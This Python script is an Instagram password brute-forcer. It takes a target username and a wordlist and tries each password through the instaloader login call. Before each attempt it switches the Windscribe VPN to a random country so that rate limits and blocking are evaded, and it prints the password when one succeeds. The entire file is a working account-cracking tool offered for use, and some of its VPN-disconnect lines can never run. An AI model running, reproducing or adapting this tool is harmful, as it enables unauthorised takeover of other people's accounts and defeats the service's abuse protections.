import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from src.linux2 import *

def arch():
    os.system("clear")
    class bcolors:
        BOLD = '\033[1m'
        PURPLE = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[95m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        UNDERLINE = '\033[4m'
    start()
    ascii()
    codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
                "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
    L = instaloader.Instaloader()
    veri_break = "no"
    print("\nVpn starting...\n")
    time.sleep(0.5)
    os.system("clear")
    ascii()
    os.system("systemctl start windscribe")
    print(bcolors.OKGREEN+"Vpn successifully started"+bcolors.ENDC)
    time.sleep(0.5)
    os.system("clear")
    ascii()
    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\nUsername: @')
        wl = input("\nWord list: ")
        sleepp = int(input("\nSleep time (seconds): "))
        while True:
            sub.call("clear")
            ascii()
            procedere = input("Username to bruteforce = "+bcolors.UNDERLINE+USER+bcolors.ENDC+"\n\nWordlist = "+bcolors.UNDERLINE+wl+bcolors.ENDC+"\n\nSleep time = "+bcolors.UNDERLINE+str(sleepp)+bcolors.ENDC+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass



    file1 = open(wl, 'r')
    Lines = file1.readlines() 
    count = 0



    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(1)
            print("\n[Changing ip address]")
            os.system("\nwindscribe connect " + choiceCode)
            print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
            L.login(USER , PASSWORD)
            print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
            break
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")
        except instaloader.exceptions.BadCredentialsException:
            pass
            print(bcolors.FAIL+"Incorrect password: "+pstest+bcolors.ENDC)
            print("sleep for "+ str(sleepp))
            time.sleep(sleepp)

        except instaloader.exceptions.ConnectionException:
            print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
            break
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")
        except instaloader.exceptions.InvalidArgumentException:
            print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")
